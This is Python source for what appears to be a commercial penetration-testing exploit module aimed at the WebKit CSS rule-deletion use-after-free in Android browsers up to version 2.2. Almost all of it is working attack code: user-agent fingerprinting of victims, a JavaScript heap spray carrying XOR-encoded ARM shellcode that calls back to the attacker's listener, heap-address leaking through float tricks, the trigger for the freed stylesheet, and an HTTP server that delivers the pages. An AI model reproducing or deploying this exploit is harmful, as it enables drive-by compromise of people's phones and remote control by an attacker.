#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
import random
import canvasengine
from shellcode.standalone.linux.arm.payloads import payloads as arm_payloads

NAME                            = "Android ParentStyleSheet"
DESCRIPTION                     = "Clientside exploit for WebKit css rule deletion vulnerability."
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Google"
DOCUMENTATION["Repeatability"]  = "Single"
DOCUMENTATION["Reference"]      = ""
DOCUMENTATION["CVE"]            = ""
DOCUMENTATION["CVE url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name="
DOCUMENTATION["BUGTRAQ url"]    = "https://bugs.webkit.org/show_bug.cgi?id=51993"
DOCUMENTATION["NOTES"]          = """
This exploit will work under Android <= 2.2
Fixed in WebKit revision r75168 (http://trac.webkit.org/changeset/75168).

For more details on the vulnerability itself, please see:
http://svnsearch.org/svnsearch/repos/WEBKIT/search?logMessage=51993
"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Linux"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME

        import random
        # filename is used in the actual http server
        self.filename           = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + "00.html"
        self.cssfile            = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".css"
        # universal shellcode?
        self.universal          = True


        self.ARRAY_SIZE_ANDROID_2_2_1 = 0xd
        self.ARRAY_SIZE_ANDROID_2_1 = 0x4
        self.array_size = self.ARRAY_SIZE_ANDROID_2_1


        return

    def is_vulnerable(self,info):

        if not "Android" in info['user_agent']:
            self.log("Android not detected.")
            return 0
            
            ##Currently this exploit will just crash the browser on DroidX"
        if "DROIDX" in info['user_agent']:
            self.log("This exploit is currently not ported for DroidX.  Skipping...")
            return 0

   
        if "2.2.1" in info['user_agent']:
            self.array_size = self.ARRAY_SIZE_ANDROID_2_2_1
            self.log("Android 2.2.1 detected.")
            return 100

        if "2.1" in info['user_agent']:
            self.array_size = self.ARRAY_SIZE_ANDROID_2_1
            self.log("Android 2.1 detected.")
            return 100


        self.log("Android version not recognized");
        return 0


    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]


    def run(self):
        self.log("Run this from clientd")
        return 0 


    def _float_to_plane(self, x):
        s = repr(float(x))
        e_loc = s.lower().find('e')
        if e_loc == -1:
            return s
        mantissa = s[:e_loc].replace('.', '')
        exp = int(s[e_loc+1:])
        assert s[1] == '.' or s[0] == '-' and s[2] == '.', "Unsupported format"
        sign = ''
        if mantissa[0] == '-':
            sign = '-'
            mantissa = mantissa[1:]
        digitsafter = len(mantissa) - 1     # num digits after the decimal point
        if exp >= digitsafter:
            return sign + mantissa + '0' * (exp - digitsafter) + '.0'
        elif exp <= -1:
            return sign + '0.' + '0' * (-exp - 1) + mantissa
        ip = exp + 1                        # insertion point
        return sign + mantissa[:ip] + '.' + mantissa[ip:]

    def _get_float_repr(self, addr, size):
        num = struct.unpack("d", struct.pack("<I", addr) + struct.pack("<I", size))[0]
        return self._float_to_plane(num)

    
    def make_css(self):
        css = """
        h1{
          color: white;
        }
        """
        return css
    
    def _get_heap_spam(self):

        html = """
function heapSpam()
{
    var marker = "START" + "_" + "MARK";
    var payload = "";

    document.write("loading, please wait...");
    for (i = 0; i < 0x40; i ++) 
        document.write("<br/>");

    // ea000005
    payload += unescape("\u0005\uea00");
    payload += marker;
    
    nopslead = "";
    while (nopslead.length < 0x40) nopslead += unescape("\u33bc\u0057");

    payload += nopslead

    payload +=
    """


        # Create payload
        p = arm_payloads()
        payload = p.callback(self.callback.ip, self.callback.port, universal=True, fork_exit=False)
        bincode = p.xorencode(p.assemble(payload))

        # Create the JS unescape version
        def tojs(seq):
            seq.reverse()
            return '\\u%02x%02x' % tuple(seq)

        jscode = "".join([tojs(map(ord, bincode[i:i+2])) for i in range(0, len(bincode), 2)])

        html += " unescape('" + jscode + "');"
        html += """

    memfill = new Array();

    for (i = 0; i < 0x400; i ++) {
        memfill[i] = payload;
        document.write( memfill[i]  + "</i>");
    }
    
    }
    """
        return html

  
    def search_ptr(self, ptrs, search_base):

        #prep float numbers to dump the heap
        floats = ""
        i=0
        for ptr in ptrs:
            float_repr = self._get_float_repr(ptr, 0x500)
            floats+= "floatnum[%d] = [];\n" % i
            floats+= "floatnum[%d][0] = '%s';\n" %  (i, float_repr)
            floats+= "floatnum[%d][1] = '%d';\n" %  (i, ptr)
            i+=1


        # prep callback ip and callback port
        ip = socket.inet_aton(self.callback.ip)
        ip = '\\u%.4x\\u%.4x' % (struct.unpack('<H', ip[:2])[0], struct.unpack('<H', ip[2:])[0])
        port = socket.htons(self.callback.port)
        port = '\\u%4x' % port


        html =  """
<html>

<style id="target" type="text/css">
@import url("a.css");
</style>


<script>

var DEBUG = 0

function triggerGC(){
    for(i=0; i<4100; i++){
        a = .5;
    }
}


function triggerExploit(dataptr){
    var t = new Array(0x5000);
    var style = document.createElement('style');
    style.setAttribute('type', 'text/css');
    style.setAttribute('id', "target");

    style.sheet.insertRule('.mydiv { background-color: #ffff; }', style.sheet.cssRules.length);
    var rule = style.sheet.rules[0]

    delete(style);
    style = null

    for (i=0;i<2000;i++) {
        try { style.x(); } catch(e) {}
    }

    if (DEBUG) alert("start fill");

    for (i=0;i<0x5000;i++){
         t[i] = new Array(ARRAY_SIZE);
         t[i].length = dataptr -8;
    }

    if (DEBUG) alert("end fill");


    rule.parentStyleSheet;

    if (DEBUG) alert("end");
}

function toHex(str) 
{
    var res = "";
    var i=0;
    while(i<str.length){
        charcode = data.charCodeAt(i)
        hex = charcode.toString(16);
        while(hex.length<4) hex="0"+hex;
        res += hex;
        i++;
    }
    return res;
}


HEAPSPAMFUNCTION

function doReload(){
        var loc = document.location.href;
        var base = loc.substring(0, loc.length-7);

        var currentIteration = parseInt(loc.substring(loc.length-7, loc.length-5),10);

        if (currentIteration > MAX_ITERATIONS){
            document.location = "EXIT_URL";
            //document.location = "exit";
        }
        else{
            currentIteration += 1;
            var currentIterationStr = currentIteration.toString();
            if (currentIterationStr.length == 1)
                currentIterationStr = "0"+ currentIterationStr

            
            foo =  base + currentIterationStr + ".html"
            document.location = foo;

       }

}


function run(){

    floatnum = [];
    FLOATS

    var myobj = document.createElement("h1");

    for (var i = 0; i<floatnum.length; i++){
        myobj.style["src"] = "local(" + floatnum[i][0] + ")";
    
        data = myobj.style.src;
        //remove 'local(' and ')'
        data = data.substr(0,data.length-1).substr(6)
        var pos_start = 0;

        pos_start = data.indexOf("STAR"+"T_"+"MARK", pos_start);
        while (pos_start!= -1){

           dataaddr = parseInt(floatnum[i][1]) + pos_start*2-4;
           dataptr_addr  = dataaddr - 16;
           real_ptr = data.substr(pos_start-10,2)

           dataaddr_hex = dataaddr.toString(16);
           while(dataaddr_hex.length<8) dataaddr_hex="0"+dataaddr_hex;

           foo = "%u" + dataaddr_hex.substr(4,8) + "%u" + dataaddr_hex.substr(0,4)
           if (real_ptr == unescape(foo)){
               if (DEBUG)  alert("shellcode found");
               triggerExploit(dataptr_addr);

               //if we are here the trigger failed, so retry the whole thing
               //window.location.reload()
               doReload();
           }

           pos_start += 8;
           pos_start = data.indexOf("START_M"+"ARK", pos_start);
            
        }
        data = null;
    }

    if (i>=floatnum.length){
        // we didn't found the heap-spray, retry
        //window.location.reload()
        doReload();
   
    }

}

if (DEBUG) alert("start spray 1");
heapSpam();
if (DEBUG) alert("end spray 1");

setTimeout("run()", 2);

</script>
<body>
</body>


</html>"""
        html = html.replace("FLOATS", floats)
        html = html.replace("HEAPSPAMFUNCTION", self._get_heap_spam())
        html = html.replace("SEARCHBASE", "%d"%search_base)
        html = html.replace("MAX_ITERATIONS", "6");
        html = html.replace("EXIT_URL", "http://www.google.com");

        html = html.replace("ARRAY_SIZE", "0x%x"%self.array_size);

        return html

 
    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body


        h=header('SERVER')
        b=body()
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")
            
            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None

        if clientheader.URL.count(self.filename[:-7]):
        #if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')

            ptrs = []
            heap_base = 0x0000a000;
            heap_top = 0x00414000;
            step = 0x1000;
            addr = heap_base;

            for i in range((heap_top-heap_base)/step):
                ptrs.append(addr);
                addr += step;
            sploitstring = self.search_ptr(ptrs, 0)

            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.count(self.cssfile):
            self.log('Serving CSS file')
            sploitstring=self.make_css()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/css')

        elif clientheader.URL.count("exit"):
            self.log('Max retries reached. Exploit failed. Not vulnerable?')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h,b

        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    print "This needs to be run from clientd"
